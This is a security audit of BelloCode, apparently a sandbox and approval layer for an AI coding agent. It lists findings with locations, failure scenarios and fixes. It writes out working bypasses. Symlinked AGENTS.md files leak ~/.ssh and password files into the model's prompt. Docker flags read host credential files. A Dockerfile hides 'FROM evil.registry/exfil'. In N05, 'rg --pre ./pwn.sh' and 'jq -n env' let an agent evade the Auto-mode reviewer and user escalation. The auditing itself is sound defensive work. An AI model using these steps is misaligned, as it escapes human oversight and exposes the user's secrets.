### Top 10 Findings

1. **`N01` (Critical)** — Unconfined symlinks in `Plugin/src/project.ts` (`AGENTS.md` and `.opencode/`) allow any **untrusted** repository to exfiltrate arbitrary host files (including `server.json` with `OPENCODE_PASSWORD`, `~/.ssh/id_rsa`, `~/.aws/credentials`) straight into the LLM system prompt, hang Bun on `/dev/zero`, or crash the `bellocode` plugin (disabling the container guard & Auto hooks).
2. **`N02` (Critical)** — Off-by-one bound check in `SecretPatterns.jsonUnescaped` (`SecretScanner.swift:280`) skips any `\uXXXX` escape in the last 6 bytes of a response body or header value, leaking secret values unredacted past both `ResponseFilter` and `SecretBroker`.
3. **`N03` (Critical)** — `HostDockerCommand` (R01 incomplete) allows host-side file reads (`--env-file`, `--label-file`, `build -f`/context, `compose -f`/`--env-file`, `buildx --secret`/`--build-context`) and writes (`--cache-to type=local,dest=...`), letting an agent read Mac files like `server.json` into a container; `hostDockerAccess` also omits `egress`, bypassing enforced egress.
4. **`N04` (Critical)** — Four independent R14 image-policy bypasses: duplicate TAR entries / concatenated gzip / `a/../Dockerfile` / symlinks in `BuildContextScanner` + `GzipInflater`; BuildKit `POST /build?version=2&session=` + hijacked `POST /session`; fake heredoc markers (`RUN echo "<<EOF"`) hiding subsequent `FROM` lines in `DockerfileBases`; and ignored `# syntax=` frontend directives.
5. **`N05` (Critical)** — Auto-mode approval bypasses in `RiskPolicy`: deterministic allow of `rg --pre ./script` and `git grep --open-files-in-pager=./script` (arbitrary execution inside container with no reviewer or user prompt), deterministic allow of `jq -n env` and `grep -r "" .`, and shell redirects passing `writes: false` when modifying policy files (`opencode.json`, `.mcp.json`, `.git/hooks/*`).
6. **`N06` (Critical)** — `bellocode-opencode` honours `BELLOCODE_OPENCODE_BINARY` in release builds (executing an arbitrary binary with `OPENCODE_PASSWORD`); `CLIConnectionFile.read` skips loopback URL validation, `pid > 0` check, `0o077` folder mode, and `O_NOFOLLOW`/`fstat`; `OpenCodeCLI.plan` misses `--standalone=true`.
7. **`N07` (Major)** — `DockerFilterProxy` applies the 4 MiB `maxJSONBody` cap to streaming `POST /build` and `PUT /containers/*/archive` requests, breaking real builds and `docker cp` transfers over 4 MiB.
8. **`N08` (Major)** — `SecretKit` `ContentDecoding.stream` (`ResponseFilter.swift:91`) has the unfixed twin of the `GzipInflater` infinite 100%-CPU spin loop fixed in `2652885`.
9. **`N11` (Major)** — `BrowserSupervisor.crashed()` clears `monitor = nil` before backoff and `runtime.start()`, so `stop()` (including app quit) cannot cancel crash recovery and Chrome can transition to `.ready` behind `.stopped` (R23 incomplete).
10. **`N16` (Major)** — `ComposerDraftArchive` actor reentrancy across `await files.materialize` can resurrect cleared/sent drafts, and quit termination (`AppDelegate` / `MainWindows`) neither calls `composer.controller.flushDraft()` nor synchronizes unstructured `saveDraft` tasks before `ComposerDraftArchive.shared.flush()` (R28).

## Critical Findings

### N01 — Unconfined symlinks in `Plugin/src/project.ts` exfiltrate host secrets from untrusted repos and can disable the plugin
- **Severity**: Critical
- **Locations**:
  - `Plugin/src/project.ts:28-58, 103-128, 192-202, 248-291`
  - `Plugin/server.ts:122-128, 177-197`
- **Failure scenario**:
  `Plugin/server.ts` runs inside the host `opencode` Bun process as the macOS developer user. In the default `.bellocode` mode, `instructionFiles()` runs for **every project — trusted or untrusted** — on every prompt (`ctx.session.hook("prompt")`). `nodeFS` uses `existsSync`/`statSync`/`readFileSync`, which follow symlinks with **no canonical/realpath containment check**, **no `isFile()` check**, and **no pre-read size check** in `instructionFiles()`.
  1. **Host-file exfiltration without trust**: Opening any untrusted git repository containing a tracked symlink `AGENTS.md -> ~/Library/Application Support/BelloCode/opencode/run/server.json` (which contains BelloCode's `OPENCODE_PASSWORD`), `~/.ssh/id_rsa`, `~/.aws/credentials`, or `~/.config/opencode/opencode.json` causes the host plugin to read up to 64 KiB of that host file and inject it verbatim into `session.instructions.entry.put`, exposing the secret directly in the model's system prompt and context.
  2. **Server hang (DoS)**: `AGENTS.md -> /dev/zero` or a named FIFO hangs the single-threaded Bun server process indefinitely because `readFileSync` reads without checking `stat.isFile()` or `size <= LIMITS.fileBytes`.
  3. **Plugin kill in trusted projects**: `markdownFiles()` (`Plugin/src/project.ts:192-202`) follows directory symlinks with no realpath containment and no cycle detection. A symlink `.opencode/agents/loop -> ..` causes `RangeError: Maximum call stack size exceeded` inside `refreshProjectConfig()` (`Plugin/server.ts:128`), which is uncaught in `setup()`, preventing the entire `bellocode` plugin (including `shell.create.before` container guard and `permission.evaluate` Auto hook) from loading for that location.
- **Suggested fix**:
  - Resolve `realpathSync(root)` once, use `lstatSync` (or `open` with `O_NOFOLLOW` + `fstatSync`) for every file and directory traversed by `instructionFiles()` and `loadProjectConfig()`, reject symlinks escaping `realRoot` (or reject symlinks altogether), require `isFile()` before reading, bound reads at the file-descriptor level to `LIMITS.fileBytes + 1` bytes, and track visited `(dev, ino)` pairs with a max depth in `markdownFiles()`.
  - Wrap `refreshProjectConfig()` in `try/catch` in `Plugin/server.ts:122-128` so a hostile or malformed project tree can never abort `setup()` and disable the container guard or Auto hooks.

### N02 — Off-by-one in `SecretPatterns.jsonUnescaped` leaks secrets ending with `\uXXXX` past `ResponseFilter` and `SecretBroker`
- **Severity**: Critical
- **Locations**:
  - `Sources/SecretKit/SecretScanner.swift:279-280, 299-300`
- **Failure scenario**:
  `SecretPatterns.jsonUnescaped(_:)` checks:
  ```swift
  guard index + 4 < bytes.count + 0, index + 4 <= bytes.count else { return nil }
  ```
  Because of the strict `<`, `scalar(at:)` returns `nil` whenever a `\uXXXX` escape occupies the final 6 bytes of the inspected buffer (`index + 4 == bytes.count`). The same bug affects surrogate pairs ending at EOF (`scalar(at: i + 8)`).
  For example, if a bound secret is `abcd1234` and an upstream service echoes `abcd123\u0034` as a raw response body or header value (13 bytes), `scalar(at: 9)` evaluates `9 + 4 < 13` → `false`, leaves `\u0034` unescaped, and `SecretScanner` finds no match. Both `ResponseFilter` (egress proxy) and `SecretBroker` (`secret_http`) return the encoded secret unredacted to the agent.
- **Suggested fix**:
  Change line 280 to `guard index + 4 <= bytes.count else { return nil }`, simplify line 299 to `i + 12 <= bytes.count`, and add unit tests in `Tests/SecretKitTests/ScannerTests.swift` covering `\uXXXX` and surrogate pairs at the exact end of a body and header value.

### N03 — `HostDockerCommand` permits arbitrary Mac host file reads/writes and bypasses enforced egress (`R01` incomplete)
- **Severity**: Critical
- **Locations**:
  - `Sources/ContainerKit/Workspace/HostDockerCommand.swift:57, 124-182`
  - `Sources/Engine/Containers/ExecutionModes.swift:285-289`
  - `Sources/bellocode-exec/main.swift:107-137`
- **Failure scenario**:
  In Host docker-only mode, `bellocode-exec` executes Rancher Desktop's `docker` CLI directly on the Mac as the developer (`HOME=NSHomeDirectory()`). While `R01` fixed the leading global-option early return, `HostDockerCommand.check(arguments:)` still allows host-CLI flags that read or write arbitrary Mac files *before* contacting `DockerFilterProxy`:
  1. **Arbitrary Mac file exfiltration**: `docker run --env-file ~/Library/Application\ Support/BelloCode/opencode/run/server.json alpine printenv` (or `--label-file <path>`, `docker build /Users/<user>/.ssh`, `docker build -f <host-file> .`, `docker compose -f <host-file> --env-file <host-file> config`, `docker buildx build --secret id=x,src=/Users/<user>/.ssh/id_rsa --build-context x=/Users/<user>/.ssh .`) causes the host `docker` binary to read 0600 files owned by the user on the Mac and transmit their contents into the container environment, labels, or build context.
  2. **Arbitrary Mac file write**: `docker buildx build --cache-to type=local,dest=/Users/<user>/... .` is not in `writingOptions` (line 57), allowing writes anywhere writable by the developer on the Mac.
  3. **Enforced egress bypass**: `EnvironmentService.hostDockerAccess(_:)` (`ExecutionModes.swift:286`) registers the scope with `egress: nil` (unlike `containerDockerAccess` at lines 267–271). Containers created in Host docker mode therefore join the unrestricted bridge even when enforced egress is enabled.
- **Suggested fix**:
  - Refuse file-reading/writing host CLI flags unless every referenced path is canonically verified inside the project's workspace roots (or refuse `--env-file`, `--label-file`, `--secret`, `--ssh`, `--build-context`, `--cache-to`, `--cache-from`, and non-project build/compose `-f`/context paths outright in `HostDockerCommand`).
  - Pass the project's `DockerEgress` configuration in `hostDockerAccess(_:)` when enforced egress is active, matching `containerDockerAccess`.

### N04 — Multiple `R14` image-policy bypasses in `BuildContextScanner`, `GzipInflater`, `DockerFilterPolicy`, and `DockerfileBases`
- **Severity**: Critical
- **Locations**:
  - `Sources/ContainerKit/DockerFilter/BuildContextScanner.swift:45-47, 101-106, 129-150`
  - `Sources/ContainerKit/DockerFilter/GzipInflater.swift:30, 67-70`
  - `Sources/ContainerKit/DockerFilter/DockerFilterProxy.swift:414-425`
  - `Sources/ContainerKit/DockerFilter/DockerFilterPolicy.swift:209-212, 692-740`
  - `Sources/ContainerKit/Workspace/DockerfileBases.swift:89-95, 103`
  - `Sources/ContainerKit/Network/ImageBuildNetwork.swift:127-133`
- **Failure scenario**:
  An agent (or hostile repository) can pull and build from disallowed registries in four independent ways:
  1. **Duplicate TAR entry / concatenated gzip / `..` / symlink override**: `BuildContextScanner` stops scanning on the **first** regular entry matching `target` (`state = .done`, line 104), and `DockerFilterProxy` sets `judged = true` (line 417) and streams all remaining bytes unchecked. Docker's tar extractor applies entries sequentially so the **last** entry wins. Sending an allowed `Dockerfile` first followed by a disallowed `Dockerfile` second — or placing the second in a concatenated gzip member (which `GzipInflater` ignores after `COMPRESSION_STATUS_END` at line 67, while Go's `compress/gzip` reads all members), or under `a/../Dockerfile` (`normalise` at line 45 does not collapse `..`), or overwriting it with a symlink/hardlink entry — bypasses the image policy completely.
  2. **BuildKit `/build?version=2&session=<id>` + `POST /session`**: `DockerFilterPolicy` forwards `POST /session` (`hijack: true`, line 212) and `POST /build` never rejects `version=2` or `session`. An agent can open a `/session` hijack and send `POST /build?version=2&session=<id>` with a dummy allowed `Dockerfile` body (passing `BuildContextScanner`) while BuildKit ignores the body and fetches an arbitrary Dockerfile and base images over the hijacked `/session` gRPC stream.
  3. **Fake heredoc trigger hides `FROM` instructions**: `ImageBuildNetwork.heredocMarker(_:)` (`ImageBuildNetwork.swift:127-133`) matches `<<` anywhere on any line, not just valid BuildKit heredoc instructions (`RUN`/`COPY`). A Dockerfile containing:
     ```dockerfile
     FROM allowed.corp/base:1
     RUN echo "<<EOF"
     FROM evil.registry/exfil:latest
     ```
     puts `DockerfileBases.instructions(_:)` (`DockerfileBases.swift:103`) into heredoc-skip mode until `EOF`, silently skipping `FROM evil.registry/exfil:latest` (and any `COPY --from=` / `RUN --mount=from=`). This bypasses **both** `DockerFilterPolicy` and `DevContainers`.
  4. **Unchecked `# syntax=` frontend directive**: `DockerfileBases.instructions(_:)` ignores all `#` directives except `escape=` (lines 89–95). A dev container Dockerfile starting with `# syntax=evil.registry/frontend:latest` causes `docker buildx build` to pull and execute an unapproved BuildKit frontend image.
- **Suggested fix**:
  - In `BuildContextScanner`, scan the **entire** archive to EOF, reject duplicate entries / symlinks / hardlinks / `..` segments targeting the Dockerfile, and reject trailing bytes after `COMPRESSION_STATUS_END` (or inflate concatenated gzip members in `GzipInflater`). Buffer or delay final chunk (`0\r\n\r\n`) until EOF validation passes.
  - In `DockerFilterPolicy`, reject `POST /session` and reject `version=2` / `session` query parameters on `POST /build` (the policy already states BuildKit is unsupported at line 214).
  - In `DockerfileBases`, parse `# syntax=` directives and apply the image policy to the frontend image (or refuse `# syntax=`); only enter heredoc mode for unquoted `<<`/`<<-` redirection tokens on `RUN`/`COPY` instructions (never inside quoted strings), and fail closed if a heredoc is still open at EOF.

### N05 — Auto-mode deterministic-allow and mandatory-escalation bypasses in `RiskPolicy`
- **Severity**: Critical
- **Locations**:
  - `Sources/Engine/Auto/RiskPolicy.swift:211-222, 361-386, 418-423, 540-549, 561-569, 575-602`
- **Failure scenario**:
  `RiskPolicy` documents that mandatory escalations cannot be overridden and that deterministic allows cover only safe in-project reads, edits, and read-only shell commands. In practice, an agent running in **Auto** mode can bypass both the Auto LLM reviewer and mandatory user escalation:
  1. **Deterministic arbitrary command execution via `rg --pre` / `git grep --open-files-in-pager`**: Auto deterministically allows `write`/`edit` inside the project (lines 561–564) and deterministically allows `rg` (`readOnlyPrograms`, line 541) and `git grep` (`readOnlyGit`, line 547) with no flag check for `--pre` or `--open-files-in-pager`. An agent writes `./pwn.sh` inside the repo (deterministically allowed), then runs `rg --pre ./pwn.sh x README.md` or `git grep --open-files-in-pager=./pwn.sh x`. Both `commandFindings` (empty) and `readOnlyShell` (`true`) pass, returning `.allow("read_only_command", ...)` and running arbitrary commands (`curl`, `git push --force`, `rm -rf`, etc.) without hitting the reviewer or user.
  2. **Deterministic secret & env reads**: `jq` is in `readOnlyPrograms` (line 542); `jq -n env` passes `readOnlyShell` with zero findings and prints every container environment variable. Similarly, `grep -r "" .` or `rg -uu .` passes `readOnlyShell` because `.` is not a secret filename, reading `.env` and secret files inside the project without triggering `.secretRead`.
  3. **Shell writes to policy files skip mandatory escalation**: `redirectFindings` (line 383–386) delegates to `argPathFindings`, which calls `pathFindings(..., writes: false)` (line 380). Writing to `opencode.json`, `.mcp.json`, `.devcontainer/devcontainer.json`, `.git/hooks/pre-commit`, or `.git/config` via `echo ... > .git/hooks/pre-commit` or `cp a opencode.json` never triggers `policyFile(...)` (line 218 requires `writes == true`), bypassing mandatory escalation and falling through to the LLM reviewer. Likewise `printenv ANTHROPIC_API_KEY` has a non-empty `positional` array (line 419), skipping `.secretRead`.
- **Suggested fix**:
  - In `readOnlyShell`: reject `rg` when `--pre`/`--pre-glob` is present; reject `git` when `--open-files-in-pager`, `--ext-diff`, `--textconv`, or `-O` is present; remove `jq` (or forbid `env`/`$ENV` filters) and `less`/`more` from `readOnlyPrograms`; and do not deterministically allow recursive directory searches (`-r`/`-R`/`rg` without explicit non-secret file arguments) when secret files may exist, or escalate `rg`/`grep` on hidden/ignored files (`-u`/`--hidden`/`--no-ignore`).
  - Pass `writes: true` from `redirectFindings` (for output redirects `>`, `>>`, `&>`, `>|`) and flag any shell argument referencing a `policyFile` for write-capable programs (`cp`, `mv`, `tee`, `install`, `sed`, `perl`, `python*`, `touch`, `ln`, `chmod`) or unconditionally escalate policy-file references in shell commands.
  - In `programFindings`, flag `printenv <VAR>` whenever `secretVariable(arg)` is true.

### N06 — `bellocode-opencode` honours `BELLOCODE_OPENCODE_BINARY` in release builds; `CLIConnectionFile` and `--standalone` gaps
- **Severity**: Critical
- **Locations**:
  - `Sources/bellocode-opencode/main.swift:28`
  - `Sources/OpenCodeKit/Server/OpenCodeIsolation.swift:132-148`
  - `Sources/OpenCodeKit/Server/OpenCodeCLI.swift:53, 134, 144, 150-158`
- **Failure scenario**:
  1. **Release-build binary hijack with `OPENCODE_PASSWORD`**: Unlike `BrowserImageContext.allowsDevelopmentSources` (`#if DEBUG`, R18), `bellocode-opencode/main.swift:28` unconditionally honours `BELLOCODE_OPENCODE_BINARY` in release builds. If that variable is present in the caller's environment, the signed `bellocode-opencode` helper reads BelloCode's `0600` `server.json`, places `OPENCODE_PASSWORD` into the child environment (`OpenCodeCLI.swift:154`), and `execve`s the arbitrary binary at `BELLOCODE_OPENCODE_BINARY`.
  2. **`CLIConnectionFile.read` validation gaps**:
     - Never checks that `value.url` is loopback (`127.0.0.1`, `::1`, `localhost`) with `http` scheme before `OpenCodeCLI.plan` passes `--server <url>` and `OPENCODE_PASSWORD`. (Combined with `BELLOCODE_OPENCODE_DATA_ROOT`, also unguarded in release builds at `OpenCodeCLI.swift:172`, a tampered connection file sends `OPENCODE_PASSWORD` to a remote server.)
     - Checks `kill(value.pid, 0) != 0, errno == ESRCH` (line 146) without checking `value.pid > 0`. A crafted/corrupt `pid` of `0` or `-1` signals the caller's process group / all processes and returns `0`, falsely reporting the server alive.
     - Checks folder permissions with `(folder.st_mode & 0o022) == 0` (line 140) instead of `0o077`, contradicting the doc comment ("not readable or writable by group or others (nor its folder)") and `write()`'s `0o700`.
     - Performs `lstat(file.path)` (line 134) then `Data(contentsOf: file)` (line 144) — a TOCTOU window instead of `open(O_RDONLY | O_NOFOLLOW | O_CLOEXEC)` + `fstat(fd)`.
